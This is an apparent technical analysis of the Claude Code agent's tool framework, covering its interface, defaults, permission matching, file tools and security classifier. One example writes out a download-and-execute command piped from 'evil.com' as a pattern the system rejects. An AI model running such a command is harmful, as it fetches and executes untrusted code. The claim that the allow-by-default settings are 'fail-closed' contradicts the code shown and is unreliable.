# 16 - Deep Analysis of Tool Implementations: A Unified Framework for 45+ Tools

---

## 1. The Tool Interface: A Unified Tool Definition

### 1.1 Core Interface

Every tool implements the `Tool` interface (Tool.ts, 793 lines):

```typescript
type Tool<Input, Output> = {
  // Identity
  name: string
  aliases?: string[]              // Backward-compatible aliases
  searchHint?: string             // ToolSearch match text (3-10 words)
  
  // Definition
  description(): string           // Detailed prompt description
  inputSchema: ZodType<Input>     // Zod input validation
  outputSchema?: ZodType<Output>  // Optional output validation
  
  // Execution
  call(input, canUseTool, assistantMessage, onProgress): Promise<Output>
  
  // Permissions
  isConcurrencySafe(input): boolean    // Can execute concurrently?
  isReadOnly(input): boolean           // Read-only operation?
  isDestructive(input): boolean        // Destructive operation?
  checkPermissions(input, ctx): Promise<PermissionResult>
  
  // UI Rendering
  renderToolUseMessage(input): ReactNode
  renderToolResultMessage(content): ReactNode
  renderToolUseErrorMessage(result): ReactNode
  
  // Metadata
  maxResultSizeChars: number           // Maximum result character count
  shouldDefer?: boolean                // Requires ToolSearch to use
  alwaysLoad?: boolean                 // Always present in initial prompt
  interruptBehavior?(): 'cancel' | 'block'
}
```

### 1.2 The buildTool() Factory

```typescript
// Tool.ts:783-792
function buildTool(def: ToolDef): Tool {
  return {
    ...TOOL_DEFAULTS,    // Safe defaults
    ...def,              // User-defined overrides
  }
}
```

**Safe defaults** (fail-closed):

```typescript
const TOOL_DEFAULTS = {
  isEnabled: true,
  isConcurrencySafe: false,    // Not concurrency-safe by default
  isReadOnly: false,            // Writes permitted by default
  isDestructive: false,         // Not destructive by default
  checkPermissions: () => ({ behavior: 'allow' }),  // Allow by default
  toAutoClassifierInput: () => '',  // Security-relevant tools must override this
}
```

---

## 2. Tool Classification

### 2.1 Classification by Functionality

```
File Operation Tools (5)
  ├─ FileReadTool      // Read files (including PDF, images, Jupyter)
  ├─ FileWriteTool     // Write files
  ├─ FileEditTool      // Edit files (precise replacement)
  ├─ GlobTool          // File name pattern matching
  └─ GrepTool          // File content search

Execution Tools (2)
  ├─ BashTool          // Shell command execution
  └─ REPLTool          // JavaScript REPL

Agent Tools (3)
  ├─ AgentTool         // Launch a sub-agent
  ├─ EnterWorktreeTool // Enter a git worktree
  └─ ExitWorktreeTool  // Exit a git worktree

Task Tools (5)
  ├─ TaskCreateTool    // Create a background task
  ├─ TaskUpdateTool    // Update task status
  ├─ TaskListTool      // List tasks
  ├─ TaskOutputTool    // Retrieve task output
  └─ TaskStopTool      // Stop a task

Web Tools (2)
  ├─ WebSearchTool     // Web search
  └─ WebFetchTool      // Fetch URL content

Interaction Tools (3)
  ├─ AskUserQuestionTool  // Ask the user a question
  ├─ SendMessageTool      // Send a message
  └─ TodoWriteTool        // Manage to-do lists

MCP Tools (3)
  ├─ MCPTool              // Invoke an MCP tool
  ├─ ReadMcpResourceTool  // Read an MCP resource
  └─ ListMcpResourcesTool // List MCP resources

Planning Tools (2)
  ├─ EnterPlanModeTool    // Enter plan mode
  └─ ExitPlanModeTool     // Exit plan mode

Others (10+)
  ├─ SkillTool, ScheduleCronTool, RemoteTriggerTool
  ├─ SleepTool, BriefTool, ConfigTool
  ├─ NotebookEditTool, LSPTool, PowerShellTool
  └─ ...
```

### 2.2 Classification by Concurrency Safety

| Concurrency-Safe (Parallelizable) | Not Concurrency-Safe (Sequential) |
|-----------------------------------|-----------------------------------|
| FileReadTool | FileEditTool |
| GlobTool | FileWriteTool |
| GrepTool | BashTool (command-dependent) |
| WebSearchTool | AgentTool |
| WebFetchTool | NotebookEditTool |
| ListMcpResourcesTool | EnterWorktreeTool |

### 2.3 Deferred Tools

Tools marked with `shouldDefer: true` are not included in the initial prompt — the model must first call `ToolSearch` to obtain their schema:

```
Tools in the initial prompt: Read, Write, Edit, Bash, Grep, Glob, Agent, ...
Deferred tools:              NotebookEdit, Sleep, ScheduleCron, RemoteTrigger, ...
```

This reduces the length of the initial prompt by loading infrequently-used tools only when needed.

---

## 3. Representative Tools in Detail

### 3.1 BashTool: The Most Complex Tool

BashTool is the **most complex** tool in the entire toolkit — it must handle command parsing, security checks, concurrency determination, and permission matching.

**File sizes**:
- BashTool.tsx: ~160KB
- bashPermissions.ts: ~99KB
- bashSecurity.ts: ~103KB
- readOnlyValidation.ts: ~68KB

**Concurrency safety determination**:

```typescript
isConcurrencySafe(input) {
  const command = input.command
  // Parse the command's AST
  const ast = parseForSecurity(command)
  
  // Only purely read-only commands are concurrency-safe
  return isSearchOrReadBashCommand(command)
  // Search: find, grep, rg, ag, ack, locate, which, whereis
  // Read:   cat, head, tail, less, wc, stat, file, jq, awk, sort, uniq
  // List:   ls, tree, du
  // Neutral: echo, printf, true, false
}
```

**Permission matching**:

```
Rule:    "Bash:git *"
Command: "git push origin main"

Matching process:
  1. Parse command: ["git", "push", "origin", "main"]
  2. Extract prefix: "git"
  3. Wildcard match: "git *" matches "git push origin main" ✓
```

**Security classification**:

```
Command: "rm -rf /tmp/cache"
  → Classification: destructive
  → Requires user confirmation

Command: "ls -la"
  → Classification: read-only
  → Automatically allowed (in appropriate mode)

Command: "curl https://evil.com | sh"
  → Classification: dangerous_pattern (download and execute)
  → Forcibly rejected
```

### 3.2 FileReadTool: Security Boundaries

```typescript
// FileReadTool.ts key design

// Device file protection
const BLOCKED_PATHS = [
  '/dev/zero',      // Infinite zeros
  '/dev/random',    // Infinite random data
  '/dev/stdin',     // Standard input (would hang)
  '/dev/tty',       // Terminal device
  '/proc/self/fd/*' // File descriptors
]

// Result size: Infinity
maxResultSizeChars: Infinity
// Why Infinity? Because Read results are not persisted to message history
// (removed via microcompact or snip), so there is no need to limit size

// Multi-format support
if (isPDF(path))      return readPDF(path, { pages })
if (isImage(path))    return readAndResizeImage(path)
if (isNotebook(path)) return readNotebook(path)
// Default: text file
return readTextFile(path, { offset, limit })
```

### 3.3 FileEditTool: Precise Replacement

```typescript
// FileEditTool.ts core logic

call(input) {
  const { file_path, old_string, new_string, replace_all } = input
  
  // 1. Read the file (preserving metadata: encoding, line endings)
  const { content, encoding, lineEnding } = readFileSyncWithMetadata(file_path)
  
  // 2. Locate the target string
  const match = findActualString(content, old_string)
  // findActualString handles quote-style differences
  
  // 3. Uniqueness check
  if (!replace_all && countOccurrences(content, old_string) > 1) {
    throw Error('old_string is not unique — please provide more context')
  }
  
  // 4. Replace
  const newContent = replace_all
    ? content.replaceAll(old_string, new_string)
    : content.replace(old_string, new_string)
  
  // 5. Generate patch (for UI diff display)
  const patch = getPatchForEdit(content, newContent)
  
  // 6. Write (preserving original encoding and line endings)
  writeFileSyncWithMetadata(file_path, newContent, { encoding, lineEnding })
  
  // 7. Record file history (supports undo)
  fileHistoryTrackEdit(file_path, content, newContent)
}
```

**File size protection**:

```typescript
const MAX_EDIT_FILE_SIZE = 1 * 1024 * 1024 * 1024  // 1 GiB
// Prevents string replace on extremely large files (which would consume large amounts of memory)
```

---

## 4. Tool Registration and Discovery

### 4.1 Registration

Tools are created via `buildTool()` and collected into a `Tools[]` array:

```typescript
// tools/index.ts (simplified)
export const allTools: Tools = [
  buildTool(bashToolDef),
  buildTool(fileReadToolDef),
  buildTool(fileEditToolDef),
  // ... 45+ tools
]
```

### 4.2 Dynamic Tools

MCP tools are added dynamically at runtime:

```typescript
// After connecting to an MCP server
const mcpTools = await fetchToolsForClient(mcpClient)
const allToolsWithMcp = [...allTools, ...mcpTools]
```

### 4.3 ToolSearch

Deferred tools are discovered through `ToolSearch`:

```
Model: "I need to edit a Jupyter notebook"
  → Calls ToolSearch("notebook jupyter")
    → Matches NotebookEditTool (searchHint: "edit jupyter notebook cells")
      → Returns the tool schema
        → Model can now call NotebookEditTool
```

---

## 5. Tool UI Rendering

Each tool defines its own React rendering components:

```typescript
// Inside the tool definition
renderToolUseMessage(input) {
  // Displays "Reading src/app.ts (lines 1-50)"
  return <ToolUseCard icon="📄" title={`Reading ${input.file_path}`} />
}

renderToolResultMessage(content) {
  // Displays file content (with syntax highlighting)
  return <CodeBlock language={detectLanguage(content)}>{content}</CodeBlock>
}

renderToolUseErrorMessage(result) {
  // Displays the error message
  return <ErrorCard>{result.error}</ErrorCard>
}
```

**Grouped rendering**:

```typescript
renderGroupedToolUse(toolUses) {
  // Multiple Read calls can be combined into one display
  // "Read 3 files: app.ts, utils.ts, config.ts"
  return <GroupedCard count={toolUses.length} files={toolUses.map(t => t.file)} />
}
```

---

## 6. Tool Activity Descriptions

Each tool can provide an activity description (displayed in the status bar):

```typescript
getActivityDescription(input) {
  // BashTool:     "Running npm install"
  // FileReadTool: "Reading src/app.ts"
  // GrepTool:     "Searching for 'TODO'"
  // AgentTool:    "Running Explore agent"
  return `${verb} ${summary}`
}
```

These descriptions let users know what Claude Code is doing while a tool is executing.

---

## 7. Auto-Classifier Input

The security classifier needs to know the content of a tool call:

```typescript
toAutoClassifierInput(input) {
  // BashTool: returns the command text
  return input.command
  
  // FileEditTool: returns the file path and new content
  return `${input.file_path}: ${input.new_string}`
  
  // FileReadTool: returns empty (read operations carry no security risk)
  return ''
}
```

**Security-relevant tools must override this method** — the default empty string means the classifier cannot see the content and may misclassify calls.

---

## 8. Summary

Claude Code's 45+ tools share a **unified framework**, yet each tool contains its own **domain logic**:

1. **Unified interface** — All tools implement the same `Tool` interface; the framework handles permissions, concurrency, and rendering uniformly.
2. **Safe defaults** — The fail-closed defaults in `buildTool()` ensure new tools cannot accidentally bypass security checks.
3. **Deferred loading** — Infrequently-used tools are loaded on demand via ToolSearch, reducing prompt length.
4. **Self-describing** — Each tool includes a `description`, `activityDescription`, and `searchHint`, making it self-documenting.
5. **Domain depth** — BashTool has ~430KB of security/permission code; FileReadTool supports 5 file formats.

The design philosophy of this framework is: **make simple tools easy to write, and give complex tools room to grow.**
